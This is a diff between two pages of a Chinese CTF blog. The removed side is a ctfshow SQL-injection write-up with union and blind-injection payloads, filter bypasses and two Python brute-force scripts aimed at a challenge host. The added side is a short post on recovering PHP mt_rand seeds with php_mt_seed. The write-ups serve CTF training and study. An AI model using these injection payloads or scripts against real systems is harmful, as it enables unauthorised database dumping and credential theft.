@@ -6,22 +6,26 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://wh1tecell.top">
-  <title>ctfshow入门sql注入部分 | Wh1tecell&#39;blog</title>
+  <title>php伪随机数漏洞 | Wh1tecell&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="ctfshow web入门 sql注入部分(不断更新)">
+  <meta name="description" content="针对ctf中伪随机数漏洞利用的小结">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ctfshow入门sql注入部分">
-<meta property="og:url" content="https://wh1tecell.top/2020/11/14/[ctfshow%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5%E9%83%A8%E5%88%86]/index.html">
+<meta property="og:title" content="php伪随机数漏洞">
+<meta property="og:url" content="https://wh1tecell.top/2020/10/10/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/index.html">
 <meta property="og:site_name" content="Wh1tecell&#39;blog">
-<meta property="og:description" content="ctfshow web入门 sql注入部分(不断更新)">
+<meta property="og:description" content="针对ctf中伪随机数漏洞利用的小结">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://s3.ax1x.com/2020/11/14/DCAtTs.png">
-<meta property="og:image" content="https://s3.ax1x.com/2020/11/14/DCAlSf.png">
-<meta property="article:published_time" content="2020-11-14T04:58:15.000Z">
-<meta property="article:modified_time" content="2021-01-03T12:06:41.951Z">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/0bea9d50a588a31bb6a9e033987d6034.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201013155039595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201013155049424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201013155151119.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201013155210758.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201013155220900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="article:published_time" content="2020-10-10T09:54:52.000Z">
+<meta property="article:modified_time" content="2021-01-04T03:38:41.324Z">
 <meta property="article:author" content="Wh1tecell">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://s3.ax1x.com/2020/11/14/DCAtTs.png">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/img_convert/0bea9d50a588a31bb6a9e033987d6034.png">
   
     <link rel="alternative" href="/atom.xml" title="Wh1tecell&#39;blog" type="application/atom+xml">
   
@@ -160,20 +164,20 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-[ctfshow入门sql注入部分]" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-php伪随机数" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      ctfshow入门sql注入部分
+      php伪随机数漏洞
     </h1>
   
 
         
-        <a href="/2020/11/14/%5Bctfshow%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5%E9%83%A8%E5%88%86%5D/" class="archive-article-date">
-  	<time datetime="2020-11-14T04:58:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-14</time>
+        <a href="/2020/10/10/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/" class="archive-article-date">
+  	<time datetime="2020-10-10T09:54:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-10</time>
 </a>
         
       </header>
@@ -183,52 +187,31 @@
         
     <div class="article-entry" itemprop="articleBody">
       
-        <p>ctfshow web入门 sql注入部分(不断更新)</p>
+        <p>针对ctf中伪随机数漏洞利用的小结</p>
 <a id="more"></a>
 
-<h2 id="171"><a href="#171" class="headerlink" title="171"></a>171</h2><p>观察可以采用报错注入，无任何过滤，观察发现是 ‘ 的闭合</p>
-<p>select测试字段，发现字段为2个</p>
-<p>1.查库：<code>100&#39; union select 1,2,database() --+</code> </p>
-<p>2.查表：<code>100’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></p>
-<p>3.查字段：<code>100&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;ctfshow_user&#39; --+</code></p>
-<p>4.查值： <code>100&#39; union select 1,2,group_concat(id,0x3a,username,0x3a,password) from ctfshow_web.ctfshow_user --+</code></p>
-<h2 id="172"><a href="#172" class="headerlink" title="172"></a>172</h2><p>1.和上一题一样，唯一不同的就是字段数不一样，字段数为2</p>
-<h2 id="173"><a href="#173" class="headerlink" title="173"></a>173</h2><p>过滤了 flag</p>
-<h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>采用hex() 函数，将flag进行16进制转换</p>
-<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/DCAtTs"><img src="https://s3.ax1x.com/2020/11/14/DCAtTs.png" alt="DCAtTs.png"></a></p>
-<p><strong>payload:</strong><code>100 &#39; union select id,hex(username),hex(password)from ctfshow_web.ctfshow_user3 --+</code></p>
-<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>采用right()函数 进行字符串截取  注意是从右往左进行字符串截取，所以我们需要猜测flag的长度，测试得知截取从左往右第40个可以成功 绕过</p>
-<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/DCAlSf"><img src="https://s3.ax1x.com/2020/11/14/DCAlSf.png" alt="DCAlSf.png"></a></p>
-<p><strong>payload:</strong><code>100 &#39; union select id,hex(username),right(password,40)from ctfshow_web.ctfshow_user3 --+</code></p>
-<h2 id="174"><a href="#174" class="headerlink" title="174"></a>174</h2><p>过滤了数字和flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;flag|[0-9]&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>我一直在想，如果关键字被过滤了，怎么去判读字段长度？</p>
-<p>其实盲注的话，貌似就没有这个麻烦了</p>
-<p>做题之前先判断哪些关键字被过滤了，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?id&#x3D;1&#39;or1&#x3D;1#</span><br><span class="line">index.php?id&#x3D;1&#39;or 1&#x3D;1#</span><br></pre></td></tr></table></figure>
-<p>一碰到空格就报错，空格被过滤用 /**/绕过</p>
-<p><strong>1.爆库名（web7）</strong><br>当输入为<code>id=-1/**/or/**/ascii(substr(database(),1,1))=119</code>时出现文章内容，证明库名的第一个字符为‘w’,以此类推。</p>
-<p><strong>2.爆表名（flag,page,user）</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1&#x2F;**&#x2F;or&#x2F;**&#x2F;ascii(substr((select&#x2F;**&#x2F;table_name&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()&#x2F;**&#x2F;limit&#x2F;**&#x2F;0,1),1,1))&#x3D;102</span><br></pre></td></tr></table></figure>
-<p><strong>3.爆字段（flag）</strong><br><code>id=-1/**/or/**/ascii(substr((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=&quot;flag&quot;/**/limit/**/0,1),1,1))=102</code></p>
-<p><strong>4.爆字段值</strong><br><code>id=-1/**/or/**/ascii(substr((select/**/flag/**/from/**/flag/**/limit/**/0,1),1,1))=102</code></p>
-<p>下面两个python脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&#x27;http://cd13a268-7832-48b3-91ba-9bbc519bf77d.chall.ctf.show/index.php&#x27;</span></span><br><span class="line">table=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="comment">#爆表名  flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span></span><br><span class="line">        <span class="comment">#爆字段名 flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span></span><br><span class="line">        <span class="comment">#读取flag</span></span><br><span class="line">        payload = <span class="string">&quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;</span>%(<span class="built_in">str</span>(i), <span class="built_in">str</span>(j))</span><br><span class="line"></span><br><span class="line">        ra = s.get(url=url + <span class="string">&#x27;?id=0/**/or/**/&#x27;</span> + payload).text</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;I asked nothing&#x27;</span> <span class="keyword">in</span> ra:</span><br><span class="line">            table += <span class="built_in">chr</span>(j)</span><br><span class="line">            print(table)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line">url = <span class="string">&quot;http://cd13a268-7832-48b3-91ba-9bbc519bf77d.chall.ctf.show/index.php?id=-1&#x27;/**/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>(<span class="params">url</span>):</span>  <span class="comment"># 爆库名</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">            u = <span class="string">&quot;or/**/ascii(substr(database()/**/from/**/&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;/**/for/**/1))=&quot;</span> + <span class="built_in">str</span>(j) + <span class="string">&quot;#&quot;</span></span><br><span class="line">            s = url + u</span><br><span class="line">            print(s)</span><br><span class="line">            r = requests.get(s)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;By Rudyard Kipling&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                print(<span class="built_in">chr</span>(j))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">table</span>(<span class="params">url</span>):</span>  <span class="comment"># 爆表名</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">128</span>):</span><br><span class="line">                u = <span class="built_in">id</span> = <span class="string">&quot;||/**/ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/1/**/offset/**/&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    i) + <span class="string">&quot;)/**/from/**/&quot;</span> + <span class="built_in">str</span>(j) + <span class="string">&quot;/**/for/**/1))=&quot;</span> + <span class="built_in">str</span>(k) + <span class="string">&quot;#&quot;</span></span><br><span class="line">                s = url + u</span><br><span class="line">                print(s)</span><br><span class="line">                r = requests.get(s)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;By Rudyard Kipling&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    table_name += <span class="built_in">chr</span>(k)</span><br><span class="line">            print(table_name)</span><br><span class="line"></span><br><span class="line">db(url);</span><br><span class="line">table(url);</span><br></pre></td></tr></table></figure>
-
-
-
-
+<h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><h3 id="mt-rand"><a href="#mt-rand" class="headerlink" title="mt_rand()"></a>mt_rand()</h3><p>mt_rand函数有两个可选参数 min 和 max，如果没有提供可选参数，mt_rand函数将返回返回 0 到 mt_getrandmax() 之间的伪随机数。例如想要 5 到 15（包括 5 和 15）之间的随机数，用 mt_rand(5, 15)。</p>
+<h3 id="mt-srand"><a href="#mt-srand" class="headerlink" title="mt_srand()"></a>mt_srand()</h3><p>用于播下一个更好的随机数发生器种子，用 <code>seed</code> 来给随机数发生器播种。 没有设定 <code>seed</code> 参数时，会被设为随时数。自 PHP 4.2.0 起，不再需要用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.srand.php">srand()</a> 或 <strong>mt_srand()</strong> 给随机数发生器播种 ，因为现在是由系统自动完成的。</p>
+<p><strong>简单来说mt_scrand()通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数</strong></p>
+<p>这张图能帮助我们更好的了解php伪随机数</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0bea9d50a588a31bb6a9e033987d6034.png" alt="img"></p>
+<h2 id="代码测试"><a href="#代码测试" class="headerlink" title="代码测试"></a>代码测试</h2><p>我们输入种子12345 ，发现不管什么时候，回显的随机数都是一样的。其实，这就是伪随机数的漏洞，存在可预测性。</p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155039595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155049424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><strong>总的来说，我们知道种子后，可以确定你输出伪随机数的序列。 知道你的随机数序列，可以确定你的种子。</strong>  </p>
+<h2 id="根据随机数预测种子"><a href="#根据随机数预测种子" class="headerlink" title="根据随机数预测种子"></a>根据随机数预测种子</h2><p>以上面生成的随机数为例，假设我们知道了第一个生成的随机数，那我们怎么预测种子呢？<br>那就要用到<strong>php_mt_seed</strong>这个工具了。</p>
+<h3 id="php-mt-seed使用方法"><a href="#php-mt-seed使用方法" class="headerlink" title="php_mt_seed使用方法"></a>php_mt_seed使用方法</h3><p>kali下，进入目录，make </p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155151119.png#pic_center" alt="在这里插入图片描述"></p>
+<p>   ./php_mt_seed 第一个随机数 ，（假设我们知道序列的第一个随机数是 1507887240）</p>
+<p>可以得到种子</p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155210758.png#pic_center" alt="在这里插入图片描述"></p>
+<p>验证种子是否一样就是看 输出的序列是否一样</p>
+<p><img src="https://img-blog.csdnimg.cn/20201013155220900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>可以看到 1507887240 就是第一个随机数，可以确定我们原先的种子就是  1142896771</p>
+<h2 id="相关习题"><a href="#相关习题" class="headerlink" title="相关习题"></a>相关习题</h2><p>平台：ctfshow    web入门  web25</p>
+<p>下面放出 此题的wp ：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.i0bin.cn/index.php/archives/50/">https://blog.i0bin.cn/index.php/archives/50/</a></p>
+<p>参考博客  ：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zaqzzz/p/9997855.html">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p>
 
       
       
@@ -263,7 +246,7 @@
     
     <br>
     <strong>本文链接：</strong>
-    https://wh1tecell.top/2020/11/14/[ctfshow%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5%E9%83%A8%E5%88%86]/
+    https://wh1tecell.top/2020/10/10/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/
     <br>
     <strong>版权声明：</strong>
     本作品采用
@@ -290,11 +273,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/刷题站//" class="article-tag-list-link color4">刷题站</a>
+        			<a href="/categories/技术学习//" class="article-tag-list-link color5">技术学习</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="/categories/刷题站/ctfshow//" class="article-tag-list-link color3">ctfshow</a>
+        			<a href="/categories/技术学习/php伪随机数漏洞//" class="article-tag-list-link color5">php伪随机数漏洞</a>
         		</li>
       		
 		</ul>
@@ -349,7 +332,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://wh1tecell.top/2020/11/14/[ctfshow%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5%E9%83%A8%E5%88%86]/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://wh1tecell.top/2020/10/10/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -363,20 +346,15 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/11/16/ctfshow%20web%20%E5%85%A5%E9%97%A8%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%83%A8%E5%88%86/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2020/10/20/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%BB%91%E9%AD%94%E6%B3%95/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          ctfshow入门命令执行部分
+          CTF中常见的黑魔法
         
       </div>
     </a>
   
-  
-    <a href="/2020/10/20/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%BB%91%E9%AD%94%E6%B3%95/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">CTF中常见的黑魔法</div>
-      <i class="icon-circle-right"></i>
-    </a>
   
 </nav>
 
@@ -401,7 +379,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#171"><span class="toc-number">1.</span> <span class="toc-text">171</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#172"><span class="toc-number">2.</span> <span class="toc-text">172</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#173"><span class="toc-number">3.</span> <span class="toc-text">173</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%80"><span class="toc-number">3.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C"><span class="toc-number">3.2.</span> <span class="toc-text">法二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#174"><span class="toc-number">4.</span> <span class="toc-text">174</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web7"><span class="toc-number">5.</span> <span class="toc-text">web7</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">相关函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mt-rand"><span class="toc-number">1.1.</span> <span class="toc-text">mt_rand()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mt-srand"><span class="toc-number">1.2.</span> <span class="toc-text">mt_srand()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%B5%8B%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">代码测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%84%E6%B5%8B%E7%A7%8D%E5%AD%90"><span class="toc-number">3.</span> <span class="toc-text">根据随机数预测种子</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-mt-seed%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">3.1.</span> <span class="toc-text">php_mt_seed使用方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E4%B9%A0%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text">相关习题</span></a></li></ol>
                     </div>
                 </span>
             </div>
